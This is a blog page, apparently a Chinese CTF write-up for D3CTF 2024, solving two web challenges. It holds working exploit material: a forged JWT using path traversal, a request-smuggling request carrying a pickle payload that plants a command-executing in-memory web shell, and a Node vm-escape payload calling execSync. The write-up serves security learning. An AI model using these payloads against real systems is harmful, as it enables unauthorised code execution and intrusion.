@@ -1,0 +1,690 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="d3pythonhttp分为前端和后端，前端为代理转发，后端有个pickle反序列化可以打 backend: 12345678910111213class index:    def GET(self):        return &quot;welcome to the backend!&quot;class backdoor:    def POST(self):        data &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D3CTF 2024 wp">
+<meta property="og:url" content="http://example.com/2024/04/27/d3_2024/index.html">
+<meta property="og:site_name" content="p4d0rn&#39;s Labyrinth">
+<meta property="og:description" content="d3pythonhttp分为前端和后端，前端为代理转发，后端有个pickle反序列化可以打 backend: 12345678910111213class index:    def GET(self):        return &quot;welcome to the backend!&quot;class backdoor:    def POST(self):        data &#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20240428100343265.png">
+<meta property="og:image" content="http://example.com/img/image-20240428100601854.png">
+<meta property="article:published_time" content="2024-04-27T08:05:00.000Z">
+<meta property="article:modified_time" content="2024-04-28T02:19:27.374Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20240428100343265.png">
+  
+  
+  
+  <title>D3CTF 2024 wp - p4d0rn&#39;s Labyrinth</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p4d0rn&#39;s labyrinth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="D3CTF 2024 wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-27 16:05" pubdate>
+          2024年4月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          65 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">D3CTF 2024 wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="d3pythonhttp"><a href="#d3pythonhttp" class="headerlink" title="d3pythonhttp"></a>d3pythonhttp</h1><p>分为前端和后端，前端为代理转发，后端有个pickle反序列化可以打</p>
+<p><code>backend</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">index</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;welcome to the backend!&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">backdoor</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">self</span>):<br>        data = web.data()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;BackdoorPasswordOnlyForAdmin&quot;</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are an admin!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            data  = base64.b64decode(data)<br>            pickle.loads(data)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Done!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>frontend</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/backend&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy_to_backend</span>():<br>    forward_url = <span class="hljs-string">&quot;python-backend:8080&quot;</span><br>    conn = http.client.HTTPConnection(forward_url)<br>    method = request.method<br>    headers = &#123;key: value <span class="hljs-keyword">for</span> (key, value) <span class="hljs-keyword">in</span> request.headers <span class="hljs-keyword">if</span> key != <span class="hljs-string">&quot;Host&quot;</span>&#125;<br>    data = request.data<br>    path = <span class="hljs-string">&quot;/&quot;</span><br>    <span class="hljs-keyword">if</span> request.query_string:<br>        path += <span class="hljs-string">&quot;?&quot;</span> + request.query_string.decode()<br>    conn.request(method, path, body=data, headers=headers)<br>    response = conn.getresponse()<br>    <span class="hljs-keyword">return</span> response.read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> token <span class="hljs-keyword">and</span> verify_token(token):<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            <span class="hljs-keyword">if</span> jwt.decode(token, algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>], options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)[<span class="hljs-string">&#x27;isadmin&#x27;</span>]:<br>                forward_url = <span class="hljs-string">&quot;python-backend:8080&quot;</span><br>                conn = http.client.HTTPConnection(forward_url)<br>                method = request.method<br>                headers = &#123;key: value <span class="hljs-keyword">for</span> (key, value) <span class="hljs-keyword">in</span> request.headers <span class="hljs-keyword">if</span> key != <span class="hljs-string">&#x27;Host&#x27;</span>&#125;<br>                data = request.data<br>                path = <span class="hljs-string">&quot;/&quot;</span><br>                <span class="hljs-keyword">if</span> request.query_string:<br>                    path += <span class="hljs-string">&quot;?&quot;</span> + request.query_string.decode()<br>                <span class="hljs-keyword">if</span> headers.get(<span class="hljs-string">&quot;Transfer-Encoding&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).lower() == <span class="hljs-string">&quot;chunked&quot;</span>:<br>                    data = <span class="hljs-string">&quot;&#123;&#125;\r\n&#123;&#125;\r\n0\r\n\r\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(data))[<span class="hljs-number">2</span>:], data.decode())<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;BackdoorPasswordOnlyForAdmin&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not an admin!&quot;</span><br>                conn.request(method, <span class="hljs-string">&quot;/backdoor&quot;</span>, body=data, headers=headers)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Done!&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not an admin!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> jwt.decode(token, algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>], options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)[<span class="hljs-string">&#x27;isadmin&#x27;</span>]:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome admin!&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not an admin!&quot;</span><br>    <span class="hljs-keyword">else</span>: <br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>, code=<span class="hljs-number">302</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>(<span class="hljs-params">kid</span>):<br>    key = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;/app/&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+kid, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            key = f.read()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-built_in">print</span>(key)<br>    <span class="hljs-keyword">return</span> key<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_token</span>(<span class="hljs-params">token</span>):<br>    header = jwt.get_unverified_header(token)<br>    kid = header[<span class="hljs-string">&quot;kid&quot;</span>]<br>    key = get_key(kid)<br>    <span class="hljs-keyword">try</span>:<br>        payload = jwt.decode(token, key, algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>])<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure>
+
+<p>需要登录<code>admin</code>才能请求后端<code>/backdoor</code>接口，<code>kid</code>为可控，让其为<code>/dev/null</code>变成空密钥</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br>token_dict = &#123;<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;p4d0rn&quot;</span>,<br>  <span class="hljs-string">&quot;isadmin&quot;</span>: <span class="hljs-literal">True</span><br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&quot;kid&quot;</span>: <span class="hljs-string">&quot;../dev/null&quot;</span>,<br>    <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>    <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>jwt_token = jwt.encode(token_dict,  <span class="hljs-comment"># payload</span><br>                       <span class="hljs-string">&quot;&quot;</span>,  <span class="hljs-comment"># secret key</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,  <span class="hljs-comment"># default HS256</span><br>                       headers=headers<br>                       )<br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure>
+
+<p>要访问<code>/backdoor</code>接口，请求体要有<code>BackdoorPasswordOnlyForAdmin</code>，但后端想要执行pickle反序列化又不能有这段字符串</p>
+<p>考虑前后端对HTTP报文的解析差异，前端是flask写的，后端是web.py写的</p>
+<p>参考这篇文章来构造chunk data👉<code>https://xz.aliyun.com/t/7501</code></p>
+<p>经过了<code>A thousand years later</code>.jpg 的尝试，发现如果往后端两条<code>Transfer-Encoding: chunked</code>请求头可以成功让其走CL解析</p>
+<p>看了一下后端<code>web.data()</code>的源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">data</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Returns the data sent with the request.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;data&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ctx:<br>        <span class="hljs-keyword">if</span> ctx.env.get(<span class="hljs-string">&quot;HTTP_TRANSFER_ENCODING&quot;</span>) == <span class="hljs-string">&quot;chunked&quot;</span>:<br>            ctx.data = ctx.env[<span class="hljs-string">&quot;wsgi.input&quot;</span>].read()<br>        <span class="hljs-keyword">else</span>:<br>            cl = intget(ctx.env.get(<span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>), <span class="hljs-number">0</span>)<br>            ctx.data = ctx.env[<span class="hljs-string">&quot;wsgi.input&quot;</span>].read(cl)<br>    <span class="hljs-keyword">return</span> ctx.data<br></code></pre></td></tr></table></figure>
+
+<p>也就是<code>Transfer-Encoding</code>不为<code>chunked</code>就会走CL解析</p>
+<p>但是如果有多条<code>Transfer-Encoding</code>，下面就会返回如<code>chunked,chunked</code>就会引起报错</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">data = request.data  <span class="hljs-comment"># 返回byte</span><br><span class="hljs-keyword">if</span> headers.get(<span class="hljs-string">&quot;Transfer-Encoding&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).lower() == <span class="hljs-string">&quot;chunked&quot;</span>:<br>    data = <span class="hljs-string">&quot;&#123;&#125;\r\n&#123;&#125;\r\n0\r\n\r\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(data))[<span class="hljs-number">2</span>:], data.decode()) <span class="hljs-comment"># byte转成str</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;BackdoorPasswordOnlyForAdmin&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:   <span class="hljs-comment"># str not in byte =&gt; error</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not an admin!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>试了在<code>Transfer-Encoding</code>后端加空白符，flask均将其视为<code>Transfer-Encoding</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">Transfer-Encoding[空格]: chunked<br>Transfer-Encoding[\t]: chunked<br></code></pre></td></tr></table></figure>
+
+<p>注意到前端拼接chunk data前判断<code>Transfer-Encoding</code>特意转了小写，这说明flask底层处理http报文不会将其转小写（否则这就是多此一举</p>
+<p>盲猜一把大写绕过。现在就是前端走TE解析，后端走CL解析。</p>
+<p>比赛平台和上次的hgame一样，按这个平台尿性估计又是DNS可出网，其他不能出网。试了一下果然。</p>
+<p>前端留了一个<code>/backend</code>接口用于转发到后端<code>/</code>，那就写一个<code>web.py</code>的内存马吧</p>
+<p>利用<code>pker</code>生成pickle字节码</p>
+<p><code>exp.py</code>，就是重写了index类的GET方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">getattr</span> = GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)<br><span class="hljs-built_in">dict</span> = GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;dict&#x27;</span>)<br>dict_get = <span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">dict</span>, <span class="hljs-string">&#x27;get&#x27;</span>)<br><span class="hljs-built_in">globals</span> = GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;globals&#x27;</span>)<br>builtins = <span class="hljs-built_in">globals</span>()<br>a = dict_get(builtins, <span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">exec</span> = <span class="hljs-built_in">getattr</span>(a, <span class="hljs-string">&#x27;exec&#x27;</span>)<br><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;index.GET = lambda self: __import__(&quot;os&quot;).popen(web.input().cmd).read()&#x27;</span>)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>
+
+<p><code>python3 pker.py &lt; exp.py</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.103.122.127:30915<br><span class="hljs-attribute">cookie</span><span class="hljs-punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InA0ZDBybiIsImlzYWRtaW4iOnRydWV9.0V1NFzZpxPFENM1DEi-QvlmS_kl6a5trQY2y9hObUys<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>300<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>CHUNKED<br><br><span class="language-llvm"><span class="hljs-number">12</span><span class="hljs-keyword">c</span></span><br><span class="language-llvm">Y<span class="hljs-number">2</span>J<span class="hljs-number">1</span>aWx<span class="hljs-number">0</span>aW<span class="hljs-number">5</span>zCmdldGF<span class="hljs-number">0</span>dHIKcDAKMGNidWlsdGlucwpkaWN<span class="hljs-number">0</span>CnAxCjBnMAooZzEKUydnZXQnCnRScDIKMGNidWlsdGlucwpnbG<span class="hljs-number">9</span>iYWxzCnAzCjBnMwoodFJwNAowZzIKKGc<span class="hljs-number">0</span>ClMnX<span class="hljs-number">19</span>idWlsdGluc<span class="hljs-number">19</span>fJwp<span class="hljs-number">0</span>UnA<span class="hljs-number">1</span>CjBnMAooZzUKUydleGVjJwp<span class="hljs-number">0</span>UnA<span class="hljs-number">2</span>CjBnNgooUydpbmRleC<span class="hljs-number">5</span>HRVQgPSBsYW<span class="hljs-number">1</span>iZGEgc<span class="hljs-number">2</span>VsZjogX<span class="hljs-number">19</span>pbXBvcnRfXygib<span class="hljs-number">3</span>MiKS<span class="hljs-number">5</span>wb<span class="hljs-number">3</span>Blbih<span class="hljs-number">3</span>ZWIuaW<span class="hljs-number">5</span>wdXQoKS<span class="hljs-number">5</span>jbWQpLnJlYWQoKScKdFIu</span><br><span class="language-llvm"><span class="hljs-number">1</span><span class="hljs-keyword">c</span></span><br><span class="language-llvm">BackdoorPasswordOnlyForAdmin</span><br><span class="language-llvm"><span class="hljs-number">0</span></span><br><span class="language-llvm"></span><br></code></pre></td></tr></table></figure>
+
+<p>接着访问<code>/backend?cmd=cat /Secr3T_Flag</code></p>
+<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack_overflow"></a>stack_overflow</h1><p>太会整活了，pwn手看了脸红，web手看了流泪。</p>
+<p>刚开始还一本正经地调试去理解他创建的这个虚拟栈，以为要真正”栈溢出“覆盖这个函数</p>
+<p><code>(function (...a)&#123;  return a.map(char=&gt;char.charCodeAt(0)).join(&#39; &#39;);&#125;)</code></p>
+<p>咳咳，但这毕竟是web题，其实就是简单的代码注入+js VM逃逸。</p>
+<p>注入点在这</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;call_interface&quot;</span>:<br>    <span class="hljs-keyword">let</span> numOfArgs = stack.<span class="hljs-title function_">pop</span>()<br>    <span class="hljs-keyword">let</span> cmd = stack.<span class="hljs-title function_">pop</span>()<br>    <span class="hljs-keyword">let</span> args = []<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numOfArgs; i++) &#123;<br>    	args.<span class="hljs-title function_">push</span>(stack.<span class="hljs-title function_">pop</span>())<br>    &#125;<br>    cmd += <span class="hljs-string">&quot;(&#x27;&quot;</span>  + args.<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>) + <span class="hljs-string">&quot;&#x27;)&quot;</span><br>    <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInNewContext</span>(cmd)<br>    stack.<span class="hljs-title function_">push</span>(result.<span class="hljs-title function_">toString</span>())<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
+
+<p>cmd将传入的参数进行拼接，作为上面求ascii的函数的实参。前后闭合单引号，中间放个自执行函数即可。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;stdin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&#x27;,(function()&#123;const err = new Error();err.name = &#123;toString: new Proxy(() =&gt; \&quot;\&quot;, &#123; apply(target, thiz, args) &#123; const process = args.constructor.constructor(\&quot;return process\&quot;)(); throw process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;cat /flag &gt; /app/static/flag\&quot;).toString(); &#125;,&#125;),&#125;;try &#123;err.stack;&#125; catch (stdout) &#123;stdout;&#125;&#125;)(),&#x27;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意Dockerfile里写的<code>/readflag</code>，没有权限直接读flag，但实际环境直接读就行了，平台尿性不能出网，写flag到静态目录下去</p>
+<h1 id="moonbox"><a href="#moonbox" class="headerlink" title="moonbox"></a>moonbox</h1><p>vivo基於<code>jvm-sandbox-repeater</code>开发的流量回放平台</p>
